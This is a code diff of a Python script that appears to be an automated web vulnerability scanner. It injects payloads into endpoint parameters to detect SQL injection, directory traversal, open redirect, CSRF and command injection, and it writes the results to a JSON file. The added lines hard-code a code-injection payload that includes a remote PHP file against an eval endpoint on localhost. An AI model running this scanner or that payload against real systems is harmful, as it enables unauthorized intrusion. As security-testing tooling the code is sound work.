@@ -8,14 +8,9 @@ target = ij.BASE_URL
 
 #READ JSON
 epList = list()
-for b in data:
-	params = 0
-	ep = b["endpoint"], b["get_post"], b["get_params"], b["post_params"]
-	epList.append(ep)
-
-
-#READ PAYLOADs
-payloads = ij.get_payloads()
+for eps in data:
+	for ep in eps["endpoints"]:
+		epList.append(ep)
 
 #prepare results list
 listExploits = list()
@@ -29,46 +24,30 @@ listExploits[3]["class"] = ij.open_redirect
 listExploits[4]["class"] = ij.cross_site_request_forgery
 listExploits[5]["class"] = ij.shell_command
 
-def getId(expClass):
-	if expClass == ij.sql_injection:
-		return 0
-	elif expClass == ij.server_injection:
-		return 1
-	elif expClass == ij.directory_traversal:
-		return 2
-	elif expClass == ij.open_redirect:
-		return 3
-	elif expClass == ij.cross_site_request_forgery:
-		return 4
-	elif expClass == ij.shell_command:
-		return 5
-	
+#READ PAYLOADs
+payloads = ij.get_payloads()
+
+
 #POPULATE JSON
+
+
 for payload in payloads:
-	for ep in epList:
-		url = ep[0]
-
-		for method in ep[1]:
-			method = method.upper()
-			if method == "GET":
-				for param in ep[2]:
-					if (ij.injectPayload(url,method,param,payload) == True):
-						listExploits[getId(payload[1])]["results"][target].append(
-						{
-							"endpoint": url,
-							"params":{param:payload[0]},
-							"method": method
-						})		
 	
-			elif method == "POST":
-				for param in ep[3]:
-					if (ij.injectPayload(url,method,param,payload) == True):
-						listExploits[getId(payload[1])]["results"][target].append(
-						{
-							"endpoint": url,
-							"params":{param:payload[0]},
-							"method": method
-						})		
-
-
-print json.dumps(listExploits, indent=4)
+	for ep in epList:
+		endpoint = ep["endpoint"]
+		method = ep["method"]
+		params = ep["param"]
+		method = method.upper()
+		if payload[0] == '";include("http://localhost/badfile.php?");echo"' and endpoint == "eval2.php":
+			print ep
+			print (ij.injectPayload(endpoint,method,params[0],payload))
+'''		for param in params:
+			if (ij.injectPayload(endpoint,method,param,payload) == True):
+				listExploits[ij.getId(payload[1])]["results"][target].append(
+				{
+					"endpoint": endpoint,
+					"params":{param:payload[0]},
+					"method": method
+				})		'''
+with open("vuln.json", "w") as f:
+	f.write(json.dumps(listExploits, indent=4))
